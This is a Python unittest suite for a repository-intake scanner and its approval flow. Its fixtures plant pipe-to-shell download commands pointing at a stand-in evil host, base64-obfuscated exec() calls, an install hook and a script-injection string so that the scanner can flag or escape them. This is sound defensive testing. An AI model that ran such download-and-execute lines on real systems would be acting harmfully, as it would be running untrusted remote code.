"""Send a repo link -> report -> yes/no. Covers src/foundation/repos.py, its wiring (commands, buttons, actions, dashboard panel) and the host
agent scripts/aurix_absorb_agent.py. No network and no git: the agent's clone step is replaced by copying a fixture folder."""
import importlib.util
import json
import os
import shutil
import sys
import tempfile
import time
import unittest
from datetime import datetime, timedelta
from pathlib import Path
from unittest import mock

HERE = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(HERE))

from src import approval_gate as ag  # noqa: E402
from src.foundation import actions, audit, buttons, commands, gaming, repos  # noqa: E402

spec = importlib.util.spec_from_file_location("aurix_absorb_agent", HERE / "scripts" / "aurix_absorb_agent.py")
agent = importlib.util.module_from_spec(spec)
spec.loader.exec_module(agent)

KEY_HEX = "ab" * 32
KEY = bytes.fromhex(KEY_HEX)
URL = "https://github.com/octo/widgets"


def make_repo(root: Path, **kw) -> Path:
    """A small fake repo. kw switches: evil (pipe-to-shell + obfuscation), hooks, binaries, license."""
    root.mkdir(parents=True, exist_ok=True)
    (root / ".git").mkdir(exist_ok=True)
    (root / ".git" / "config").write_text("[core]")
    (root / "README.md").write_text("# Widgets\n\n![badge](x)\n\nWidgets is a tiny library that turns gadgets into widgets for people who need widgets.\n\nInstall: curl -s https://x.io/i.sh | sh\n")
    (root / "widgets.py").write_text("import requests\n\ndef go():\n    return requests.get('https://api.example.com/x')\n")
    (root / "requirements.txt").write_text("requests>=2\nnumpy==1.2\n# comment\n")
    (root / "tests").mkdir(exist_ok=True)
    (root / "tests" / "test_widgets.py").write_text("def test_a():\n    assert True\n")
    if kw.get("license", True):
        (root / "LICENSE").write_text("MIT License\n\nPermission is hereby granted")
    if kw.get("evil"):
        (root / "install.sh").write_text("curl https://evil.example/x.sh | bash\n")
        (root / "boot.py").write_text("import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n")
    if kw.get("hooks"):
        (root / "package.json").write_text(json.dumps({"scripts": {"postinstall": "node x.js"}, "dependencies": {"left-pad": "1.0.0"}}))
        (root / "setup.py").write_text("from setuptools import setup\nsetup()\n")
    if kw.get("binaries"):
        (root / "lib.dll").write_bytes(b"MZ" + b"\0" * 2048)
    return root


class _Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        t = Path(self.tmp.name)
        self.absorb = t / "absorb"
        self.env = mock.patch.dict(os.environ, {"AURIX_PROJECT_ROOT": str(t), "AURIX_BRAIN": str(t / "brain"), "AURIX_ABSORB_DIR": str(self.absorb),
                                                 "AURIX_GAMING_DIR": str(t / "gaming"), "AURIX_GAMING_HMAC_KEY": KEY_HEX, "ANTHROPIC_API_KEY": ""})
        self.env.start()
        ag.reset_state()
        audit._heads.clear()
        p = mock.patch.object(agent, "ROOT", self.absorb)
        p.start()
        self.addCleanup(p.stop)

    def tearDown(self):
        self.env.stop()
        self.tmp.cleanup()
        ag.reset_state()
        audit._heads.clear()

    def queue_and_review(self, url=URL, **kw):
        """Run the whole first half for real: request -> agent facts (clone replaced by a fixture) -> tick -> a report."""
        repos.request(url)
        rid = repos.all_records()[-1]["id"]

        def fake_clone(owner, repo, dest):
            make_repo(dest, **kw)
            return ""
        with mock.patch.object(agent, "clone", fake_clone):
            agent.process_requests()
        msgs = repos.tick()
        return rid, msgs


class FindRepoTests(unittest.TestCase):
    def test_links_in_all_the_usual_shapes(self):
        for text, want in [("https://github.com/octo/widgets", ("octo", "widgets")), ("look at https://github.com/octo/widgets.git please", ("octo", "widgets")),
                           ("http://www.github.com/octo/widgets/tree/main/src", ("octo", "widgets")), ("github.com/octo/wid.gets-2_x", ("octo", "wid.gets-2_x")),
                           ("(https://github.com/octo/widgets).", ("octo", "widgets"))]:
            self.assertEqual(repos.find_repo(text), want, text)

    def test_things_that_are_not_a_repo_link_or_try_to_escape(self):
        for text in ["", "no link here", "https://gitlab.com/a/b", "https://github.com/onlyowner", "https://github.com/octo/..", "https://github.com/-bad/repo",
                     "https://github.com/octo/../../etc"]:
            self.assertIsNone(repos.find_repo(text), text)


class AskTests(_Base):
    def test_a_link_becomes_a_request_and_an_audit_record_with_names_only(self):
        msg = repos.request("please look at " + URL)
        self.assertIn("octo/widgets", msg)
        [rec] = repos.all_records()
        self.assertEqual((rec["status"], rec["owner"], rec["repo"]), ("queued", "octo", "widgets"))
        req = json.loads((self.absorb / "requests" / f"{rec['id']}.json").read_text())
        self.assertEqual(set(req), {"id", "owner", "repo", "created"})                # never free text
        ev = audit.recent(3)[-1]
        self.assertEqual((ev["event"], ev["repo"]), ("repo_requested", "octo/widgets"))
        self.assertNotIn("please look", json.dumps(ev))

    def test_no_link_duplicates_and_limits(self):
        self.assertIn("GitHub link", repos.request("hello"))
        repos.request(URL)
        self.assertIn("already have", repos.request(URL))
        repos.request("https://github.com/a/b")
        repos.request("https://github.com/a/c")
        self.assertIn("already fetching", repos.request("https://github.com/a/d"))


class AnalyzeTests(unittest.TestCase):
    def facts(self, **over):
        f = {"files": 20, "size_mb": 1.0, "extensions": {".py": 12, ".md": 2}, "license": "MIT", "suspicious": [], "install_hooks": [], "binaries": [], "hard_flags": {}}
        f.update(over)
        return f

    def test_levels(self):
        self.assertEqual(repos.analyze(self.facts())["level"], "ok")
        self.assertEqual(repos.analyze(self.facts(license=""))["level"], "careful")
        self.assertEqual(repos.analyze(self.facts(suspicious=[{"file": "a.py", "line": 1, "what": "eval() use"}]))["level"], "careful")
        self.assertEqual(repos.analyze(self.facts(install_hooks=["setup.py (runs on pip install)"]))["level"], "careful")
        self.assertEqual(repos.analyze(self.facts(binaries=[{"name": "a.dll", "kb": 1}]))["level"], "careful")
        v = repos.analyze(self.facts(hard_flags={"pipe_to_shell": ["install.sh"]}))
        self.assertEqual(v["level"], "stop")
        self.assertIn("pipes it straight into a shell", " ".join(v["reasons"]))

    def test_kinds(self):
        self.assertEqual(repos.analyze(self.facts(extensions={".md": 40, ".py": 1}))["kind"], "docs")
        self.assertEqual(repos.analyze(self.facts(extensions={".md": 40}))["kind"], "docs")
        self.assertEqual(repos.analyze(self.facts(files=900, extensions={".py": 500}))["kind"], "app")
        self.assertEqual(repos.analyze(self.facts())["kind"], "tool")
        self.assertEqual(repos.analyze(self.facts(files=0, extensions={}))["kind"], "empty")


class AgentFactsTests(_Base):
    def test_it_reads_a_repo_without_running_any_of_it(self):
        d = make_repo(Path(self.tmp.name) / "r", evil=True, hooks=True, binaries=True)
        f = agent.facts_for("r-000001", "octo", "widgets", d)
        self.assertEqual(f["license"], "MIT")
        self.assertEqual(f["dependencies"][:2], ["requests", "numpy"])
        self.assertIn("left-pad", f["dependencies"])
        self.assertTrue(any("postinstall" in h for h in f["install_hooks"]))
        self.assertTrue(any("setup.py" in h for h in f["install_hooks"]))
        self.assertEqual(f["binaries"][0]["name"], "lib.dll")
        self.assertEqual(f["hard_flags"]["pipe_to_shell"], ["install.sh"])            # the README's own "curl | sh" install line is documentation, not a flag
        self.assertEqual(f["hard_flags"]["obfuscated_exec"], ["boot.py"])
        self.assertTrue(any(s["what"] == "exec() use" for s in f["suspicious"]))
        self.assertEqual(f["tests"], 1)
        self.assertNotIn(".git", f["top_level"])

    def test_a_long_encoded_blob_next_to_an_exec_is_flagged_but_data_files_are_not(self):
        d = make_repo(Path(self.tmp.name) / "r4")
        (d / "loader.py").write_text("payload = '" + "QUJD" * 300 + "'\nexec(decode(payload))\n")
        (d / "data.json").write_text(json.dumps({"image": "QUJD" * 300}))
        f = agent.facts_for("r-000004", "octo", "widgets", d)
        self.assertEqual(f["hard_flags"].get("obfuscated_exec"), ["loader.py"])

    def test_a_clean_repo_has_no_flags_and_an_empty_license_is_reported(self):
        d = make_repo(Path(self.tmp.name) / "r2", license=False)
        f = agent.facts_for("r-000002", "octo", "widgets", d)
        self.assertEqual((f["hard_flags"], f["license"]), ({}, ""))

    def test_symlinks_are_never_followed(self):
        d = make_repo(Path(self.tmp.name) / "r3")
        outside = Path(self.tmp.name) / "outside"
        outside.mkdir()
        (outside / "secret.py").write_text("exec(base64.b64decode('x'))")
        try:
            os.symlink(outside, d / "link")
        except (OSError, NotImplementedError):
            self.skipTest("symlinks not available here")
        f = agent.facts_for("r-000003", "octo", "widgets", d)
        self.assertEqual(f["hard_flags"], {})

    def test_the_clone_command_is_locked_down_and_gets_no_secrets(self):
        seen = {}

        def fake_run(cmd, **kw):
            seen["cmd"], seen["env"] = cmd, kw["env"]
            return mock.Mock(returncode=0, stdout="", stderr="")
        with mock.patch.dict(os.environ, {"AURIX_GAMING_HMAC_KEY": KEY_HEX, "TELEGRAM_TOKEN": "t", "PATH": "/usr/bin"}), mock.patch.object(agent.subprocess, "run", fake_run):
            self.assertEqual(agent.clone("octo", "widgets", Path(self.tmp.name) / "w"), "")
        cmd = " ".join(seen["cmd"])
        for needle in ("core.hooksPath=/dev/null", "core.symlinks=false", "protocol.allow=never", "protocol.https.allow=always", "filter.lfs.smudge=",
                       "--depth 1", "--no-recurse-submodules", "https://github.com/octo/widgets.git"):
            self.assertIn(needle, cmd)
        self.assertNotIn("AURIX_GAMING_HMAC_KEY", seen["env"])
        self.assertNotIn("TELEGRAM_TOKEN", seen["env"])
        self.assertEqual(seen["env"]["GIT_TERMINAL_PROMPT"], "0")


class HostCycleTests(_Base):
    def test_full_first_half_a_link_becomes_a_report_with_buttons(self):
        rid, msgs = self.queue_and_review(evil=True)
        [report] = msgs
        self.assertIn("🔴", report)
        self.assertIn("pipes it straight into a shell", report)
        self.assertIn(f"yes {rid}", report)
        self.assertIn("inert", report)
        rec = repos.load(rid)
        self.assertEqual((rec["status"], rec["verdict"]["level"]), ("review", "stop"))
        self.assertFalse((self.absorb / "requests" / f"{rid}.json").exists())
        kb = buttons.for_reply("", report)
        self.assertEqual([b["callback_data"] for row in kb["inline_keyboard"] for b in row], [f"do:yes {rid}", f"do:no {rid}"])
        self.assertEqual(repos.tick(), [])                                             # reported once

    def test_the_report_escapes_text_from_the_repo(self):
        rid, _ = self.queue_and_review()
        rec = repos.load(rid)
        rec["facts"]["readme"] = "<script>alert(1)</script> A long enough description of the widgets in this repo, right here."
        self.assertNotIn("<script>", repos.render_report(rec))

    def test_a_clone_that_fails_is_reported_plainly(self):
        repos.request(URL)
        with mock.patch.object(agent, "clone", lambda o, r, d: "repository not found or not public"):
            agent.process_requests()
        [msg] = repos.tick()
        self.assertIn("could not fetch", msg)
        self.assertIn("not found", msg)

    def test_a_request_the_agent_does_not_pick_up_gets_one_nudge(self):
        repos.request(URL)
        self.assertEqual(repos.tick(time.time() + 60), [])
        [msg] = repos.tick(time.time() + 25 * 60)
        self.assertIn("still waiting", msg)
        self.assertEqual(repos.tick(time.time() + 40 * 60), [])

    def test_the_agent_refuses_a_request_that_is_not_a_plain_repo_name(self):
        (self.absorb / "requests").mkdir(parents=True)
        (self.absorb / "requests" / "r-abcdef.json").write_text(json.dumps({"id": "r-abcdef", "owner": "octo", "repo": "../../etc"}))
        with mock.patch.object(agent, "clone", side_effect=AssertionError("must not clone")):
            agent.process_requests()
        self.assertIn("not a plain", json.loads((self.absorb / "facts" / "r-abcdef.json").read_text())["error"])


class DecisionTests(_Base):
    def test_yes_signs_and_the_host_stores_it_inert(self):
        rid, _ = self.queue_and_review()
        self.assertIn("Approved", repos.approve(rid))
        item = json.loads((self.absorb / "approved" / f"{rid}.json").read_text())
        self.assertEqual(agent.sign(KEY, item), item["sig"])                            # the two halves agree on the signature
        self.assertEqual(item["commit"], "")                                            # (the fake clone has no git history)
        res = agent.process_approved(KEY)
        self.assertEqual(res[0]["status"], "applied", res)
        lib = list((self.absorb / "library" / "octo__widgets").iterdir())
        self.assertEqual(len(lib), 1)
        self.assertFalse((lib[0] / ".git").exists())                                    # no history, no hooks
        self.assertTrue((lib[0] / "README.md").exists())
        self.assertFalse((self.absorb / "work" / rid).exists())
        self.assertEqual(json.loads((self.absorb / "library" / "registry.json").read_text())[0]["repo"], "octo/widgets")
        [done] = repos.tick()
        self.assertIn("Absorbed", done)
        self.assertEqual(repos.load(rid)["status"], "absorbed")
        self.assertEqual([e["event"] for e in audit.recent(10) if e["event"].startswith("repo_")],
                         ["repo_requested", "repo_reviewed", "repo_approved", "repo_absorbed"])

    def test_no_deletes_the_working_copy(self):
        rid, _ = self.queue_and_review()
        self.assertTrue((self.absorb / "work" / rid).exists())
        self.assertIn("Skipped", repos.decline(rid))
        agent.process_approved(KEY)
        self.assertFalse((self.absorb / "work" / rid).exists())
        self.assertEqual(repos.load(rid)["status"], "declined")
        self.assertIn("declined", repos.approve(rid))                                   # too late: nothing to approve

    def test_a_forged_or_expired_or_replayed_approval_does_nothing(self):
        rid, _ = self.queue_and_review()
        item = {"id": rid, "kind": "absorb", "owner": "octo", "repo": "widgets", "commit": "", "expires": (datetime.now().astimezone() + timedelta(hours=1)).isoformat(timespec="seconds")}
        (self.absorb / "approved").mkdir(parents=True, exist_ok=True)
        (self.absorb / "approved" / f"{rid}.json").write_text(json.dumps({**item, "sig": "0" * 64}))
        self.assertEqual(agent.process_approved(KEY)[0]["status"], "refused")
        self.assertTrue((self.absorb / "work" / rid).exists())                          # untouched
        # expired but correctly signed
        (self.absorb / "results" / f"{rid}.json").unlink()
        old = {**item, "expires": (datetime.now().astimezone() - timedelta(hours=1)).isoformat(timespec="seconds")}
        old["sig"] = agent.sign(KEY, old)
        (self.absorb / "approved" / f"{rid}.json").write_text(json.dumps(old))
        self.assertIn("expired", agent.process_approved(KEY)[0]["detail"])
        self.assertFalse((self.absorb / "library").exists())
        # no key on the machine
        (self.absorb / "results" / f"{rid}.json").unlink()
        (self.absorb / "approved" / f"{rid}.json").write_text(json.dumps({**item, "sig": agent.sign(KEY, item)}))
        self.assertEqual(agent.process_approved(None)[0]["status"], "refused")

    def test_a_path_that_is_not_a_repo_name_cannot_be_stored_anywhere(self):
        rid, _ = self.queue_and_review()
        item = {"id": rid, "kind": "absorb", "owner": "octo", "repo": "../../escape", "commit": "abc1234", "expires": (datetime.now().astimezone() + timedelta(hours=1)).isoformat(timespec="seconds")}
        item["sig"] = agent.sign(KEY, item)
        (self.absorb / "approved").mkdir(parents=True, exist_ok=True)
        (self.absorb / "approved" / f"{rid}.json").write_text(json.dumps(item))
        self.assertEqual(agent.process_approved(KEY)[0]["status"], "failed")
        self.assertFalse((self.absorb / "library").exists())

    def test_without_a_signing_key_the_owner_is_told_instead_of_crashing(self):
        rid, _ = self.queue_and_review()
        with mock.patch.dict(os.environ, {"AURIX_GAMING_HMAC_KEY": ""}):
            self.assertIn("cannot sign", repos.approve(rid))


class WiringTests(_Base):
    def test_the_ways_a_link_reaches_it(self):
        self.assertEqual(commands.parse(URL), ("repo", URL))
        self.assertEqual(commands.parse("repo " + URL)[0], "repo")
        self.assertEqual(commands.parse("look at " + URL)[0], "repo")
        self.assertEqual(commands.parse("/repos"), ("repos", ""))
        self.assertEqual(commands.parse("yes r-abc123"), ("repo_yes", "r-abc123"))
        self.assertEqual(commands.parse("Skip r-abc123"), ("repo_no", "r-abc123"))
        self.assertEqual(commands.parse("absorb r-abc123"), ("repo_yes", "r-abc123"))
        self.assertIsNone(commands.parse("what do you think about " + URL + " " + "blah " * 80))   # a long chat about it is left to the assistant

    def test_a_bare_yes_answers_the_one_thing_waiting_and_never_guesses_between_two(self):
        rid, _ = self.queue_and_review()
        self.assertEqual(commands.parse("yes"), ("repo_yes", rid))
        self.assertEqual(commands.parse("no."), ("repo_no", rid))
        gaming.save_proposal({"id": "g-abc123", "key": "k", "game": "G", "appid": "1", "kind": "missing_master", "severity": "high", "title": "t", "evidence": ["e"],
                              "fix": {"actions": [], "summary": "s", "risk": "r"}, "status": "pending", "created": time.time()})
        self.assertIsNone(commands.parse("yes"))

    def test_buttons_can_only_reach_repo_decisions_by_id(self):
        for kind in ("repo", "repos", "repo_yes", "repo_no"):
            self.assertIn(kind, buttons.ALLOWED_KINDS)
        self.assertEqual(buttons.command_from_data("do:yes r-abc123"), "yes r-abc123")

    def test_dashboard_buttons_and_validation(self):
        r = actions.run_action("repo_add", URL)
        self.assertTrue(r["ok"])
        self.assertFalse(actions.run_action("repo_add", "https://evil.example/x")["ok"])
        self.assertFalse(actions.run_action("repo_add", "")["ok"])
        self.assertFalse(actions.run_action("repo_yes", "../etc")["ok"])
        rid, _ = self.queue_and_review("https://github.com/a/b")
        d = [x for x in actions.decisions() if x["kind"] == "repo"]
        self.assertEqual([b["action"] for b in d[0]["buttons"]], ["repo_yes", "repo_no"])
        self.assertNotIn("<", json.dumps(d))
        self.assertIn("Approved", actions.run_action("repo_yes", rid)["message"])
        for name in ("repo_add", "repo_yes", "repo_no"):
            self.assertIn(name, actions.ACTION_NAMES)

    def test_panel_and_listing(self):
        self.assertIn("No repos yet", repos.list_text())
        rid, _ = self.queue_and_review()
        row = repos.panel()[0]
        self.assertEqual((row["id"], row["name"], row["status"]), (rid, "octo/widgets", "review"))
        self.assertIn(f"yes {rid}", repos.list_text())

    def test_it_is_protected_from_self_editing(self):
        from src.foundation import identity
        for path in ("src/foundation/repos.py", "scripts/aurix_absorb_agent.py", "data/repos/r-abc123.json"):
            self.assertEqual(identity.protected_component_for(path), "approval_gate", path)


if __name__ == "__main__":
    unittest.main()
